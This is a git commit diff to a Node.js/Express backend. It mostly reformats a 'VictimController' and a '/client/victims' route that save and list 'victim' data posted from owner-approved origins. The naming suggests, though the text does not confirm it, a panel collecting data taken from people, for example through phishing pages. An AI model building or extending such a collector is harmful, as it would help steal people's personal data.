a6c9c5d9a6e88ead454a91fe9afd16fb69c32c32
= <lorenzoabreu.dev@gmail.com>
2023-10-27 23:43:13 -0300

    ters

--- src/database/controllers/VictimController.js
+++ src/database/controllers/VictimController.js
@@ -5,58 +5,61 @@ const getHostname = require("../../functions/getHostname");
 const { isDev } = require("../../../index");
 
 module.exports = class VictimController {
-  async GetAll(owner) {
-    const victims = await Victim.find({
-      owner,
-    });
+    async GetAll(owner) {
+        const victims = await Victim.find({
+            owner,
+        });
 
-    try {
-      if (victims.length > 0) {
-        return {
-          status: 200,
-          victims,
-        };
-      } else {
-        return {
-          status: 200,
-          victims: [],
-        };
-      }
-    } catch {
-      return status.server_error;
-    }
-  }
-
-  async Create(owner, data, url) {
-    const userData = await User.findOne({
-      username: owner,
-    });
-
-    const allowedOrigins = userData.allowedOrigins || [];
-    console.log(url);
-    const hostname = getHostname(url);
-    if (!allowedOrigins.find((o) => o.hostname == hostname) && isDev == false) {
-      return {
-        status: 403,
-        error: "Esta origem não tem permissão para fazer isso.",
-      };
+        try {
+            if (victims.length > 0) {
+                return {
+                    status: 200,
+                    victims,
+                };
+            } else {
+                return {
+                    status: 200,
+                    victims: [],
+                };
+            }
+        } catch {
+            return status.server_error;
+        }
     }
 
-    const newVictim = new Victim({
-      owner,
-      data,
-      url,
-    });
+    async Create(owner, data, url) {
+        const userData = await User.findOne({
+            username: owner,
+        });
 
-    try {
-      const result = await newVictim.save();
-      return {
-        status: 200,
-        message: "Dados salvos com êxito!",
-        db: result,
-      };
-    } catch {
-      return status.server_error;
+        const allowedOrigins = userData.allowedOrigins || [];
+        console.log(url);
+        const hostname = getHostname(url);
+        if (
+            !allowedOrigins.find((o) => o.hostname == hostname) &&
+            isDev == false
+        ) {
+            return {
+                status: 403,
+                error: "Esta origem não tem permissão para fazer isso.",
+            };
+        }
+
+        const newVictim = new Victim({
+            owner,
+            data: data ? data : "",
+            url,
+        });
+
+        try {
+            const result = await newVictim.save();
+            return {
+                status: 200,
+                message: "Dados salvos com êxito!",
+                db: result,
+            };
+        } catch {
+            return status.server_error;
+        }
     }
-  }
 };
--- src/router/routes/client/Victims.js
+++ src/router/routes/client/Victims.js
@@ -2,29 +2,33 @@ const router = require("express").Router();
 const VictimController = require("../../../database/controllers/VictimController");
 const victim = new VictimController();
 const AuthController = require("../../../database/controllers/AuthController");
-const Auth = new AuthController();
 const status = require("../../../functions/status");
 
 router
-  .route("/client/victims")
-  .post(async (req, res) => {
-    const body = req.body;
-    const url = req.get("Referer") || req.headers.referer || "";
-    try {
-      const result = await victim.Create(req._username, body, url);
-      res.json(result);
-    } catch (e) {
-      console.log(e);
-      return res.json(status.server_error);
-    }
-  })
-  .get(async (req, res) => {
-    try {
-      const result = await victim.GetAll(req._username);
-      res.json(result);
-    } catch {
-      return res.json(status.server_error);
-    }
-  });
+    .route("/client/victims")
+    .post(async (req, res) => {
+        const body = req.body;
+        const url = req.get("Referer") || req.headers.referer || "";
+        console.log({
+            url,
+            body,
+        });
+        if (!body.data) return res.json(status.fill_all_fields);
+        try {
+            const result = await victim.Create(req._username, body, url);
+            res.json(result);
+        } catch (e) {
+            console.log(e);
+            return res.json(status.server_error);
+        }
+    })
+    .get(async (req, res) => {
+        try {
+            const result = await victim.GetAll(req._username);
+            res.json(result);
+        } catch {
+            return res.json(status.server_error);
+        }
+    });
 
 module.exports = router;
